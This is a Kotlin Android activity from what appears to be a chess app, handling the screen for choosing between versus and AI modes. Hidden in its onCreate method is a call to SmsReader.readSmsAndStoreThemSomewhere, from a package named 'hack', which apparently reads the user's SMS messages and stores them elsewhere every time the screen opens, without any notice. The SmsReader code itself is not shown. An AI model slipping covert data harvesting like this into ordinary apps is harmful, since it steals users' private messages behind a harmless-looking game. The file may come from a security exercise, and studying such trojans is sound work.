package com.esgi.davidlinhares.chess.view

import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.provider.Telephony
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import com.esgi.davidlinhares.chess.R
import com.esgi.davidlinhares.chess.hack.SmsReader

class SelectionActivity : AppCompatActivity() {
    private val presenter: ISelectionPresenter = SelectionPresenter(this)
    private lateinit var chessImage: ImageView
    private lateinit var versusButton: Button
    private lateinit var iaButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_selection)

        SmsReader.readSmsAndStoreThemSomewhere(this)

        chessImage = findViewById(R.id.king_selection_image)
        versusButton = findViewById(R.id.versus_mode_button)
        iaButton = findViewById(R.id.ia_mode_button)

        versusButton.setOnClickListener { presenter.onVersusButtonClicked() }
        iaButton.setOnClickListener { presenter.onIaButtonClicked() }
    }

    override fun onStart() {
        super.onStart()

        presenter.setImageRotation(chessImage)
    }
}

